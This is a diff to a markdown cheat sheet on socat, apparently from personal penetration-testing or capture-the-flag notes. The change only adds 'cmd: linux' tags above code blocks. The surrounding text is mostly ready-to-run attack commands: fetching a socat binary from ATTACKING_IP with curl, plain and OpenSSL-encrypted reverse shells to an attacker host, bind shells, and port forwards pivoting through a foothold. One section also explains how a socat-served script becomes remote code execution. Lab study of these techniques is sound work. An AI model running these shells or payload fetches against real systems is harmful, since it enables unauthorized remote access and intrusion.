@@ -2,6 +2,7 @@
 
 ## Wreath Commands
 
+<!-- cmd: linux -->
 ```bash
 sudo nc -lvnp 443
 curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
@@ -19,6 +20,7 @@ It's often pre-installed on Debian/Ubuntu derivatives. If not, drop a [static bi
 ## Commands Used
 
 ### Reverse shell — fully-interactive, stable PTY
+<!-- cmd: linux -->
 ```bash
 # Attacker — listener with PTY allocation
 socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
@@ -29,6 +31,7 @@ socat TCP:$LHOST:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 This is the gold-standard reverse shell — full TTY, no `Ctrl-C`-kills-the-shell, tab-completion, signals work. Replaces the four-step `python -c pty.spawn ; Ctrl-Z ; stty raw -echo ; fg ; reset` dance.
 
 ### Reverse shell — quick / on a stripped target
+<!-- cmd: linux -->
 ```bash
 # Attacker
 nc -lvnp 4444
@@ -37,6 +40,7 @@ socat TCP:$LHOST:4444 EXEC:/bin/bash
 ```
 
 ### Bind shell (target listens, attacker connects)
+<!-- cmd: linux -->
 ```bash
 # Target
 socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr
@@ -45,6 +49,7 @@ socat - TCP:$TARGET:9999
 ```
 
 ### "Host this script on a TCP port" — debug pattern that becomes RCE
+<!-- cmd: linux -->
 ```bash
 socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0
 ```
@@ -53,12 +58,14 @@ Used on: **bsidesgtdevelpy**
 this is what's serving the Python script on port 10000. The `EXEC:` clause re-spawns the script per connection. If the script `eval`s/`input()`s attacker bytes -> RCE. See [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).
 
 ### Local port forward (akin to `ssh -L`)
+<!-- cmd: linux -->
 ```bash
 # Forward attacker:8080 -> target:80
 socat TCP-LISTEN:8080,fork TCP:$TARGET:80
 ```
 
 ### Reverse port forward through a foothold (attacker:80 reachable from inside the target net)
+<!-- cmd: linux -->
 ```bash
 # On the target
 socat TCP-LISTEN:8888,fork TCP:internal-host:8080
@@ -72,6 +79,7 @@ Any time `TCP` was used as part of a command, replace it with `OPENSSL` to get a
 
 #### 1. Generate the certificate (on the attacking machine)
 
+<!-- cmd: linux -->
 ```bash
 openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 ```
@@ -80,6 +88,7 @@ This creates a 2048-bit key with a matching self-signed certificate, valid for j
 
 Merge both files into a single `.pem`:
 
+<!-- cmd: linux -->
 ```bash
 cat shell.key shell.crt > shell.pem
 ```
@@ -88,6 +97,7 @@ cat shell.key shell.crt > shell.pem
 
 #### 2. Reverse shell (encrypted)
 
+<!-- cmd: linux -->
 ```bash
 # Attacker — listener
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
@@ -100,6 +110,7 @@ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 
 #### 3. Bind shell (encrypted)
 
+<!-- cmd: linux -->
 ```bash
 # Target — listener (cert must be here)
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
@@ -114,6 +125,7 @@ For a Windows bind shell, copy the `.pem` file to the target before running the 
 
 Combine OpenSSL transport with full PTY flags for a fully interactive encrypted shell:
 
+<!-- cmd: linux -->
 ```bash
 # Attacker
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 file:`tty`,raw,echo=0
@@ -123,6 +135,7 @@ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,
 ```
 
 ### Plain proxy (UDP / mixed)
+<!-- cmd: linux -->
 ```bash
 socat UDP-LISTEN:53,fork UDP:1.1.1.1:53
 socat UNIX-LISTEN:/tmp/sock,fork TCP:127.0.0.1:8080      # UNIX <-> TCP bridge
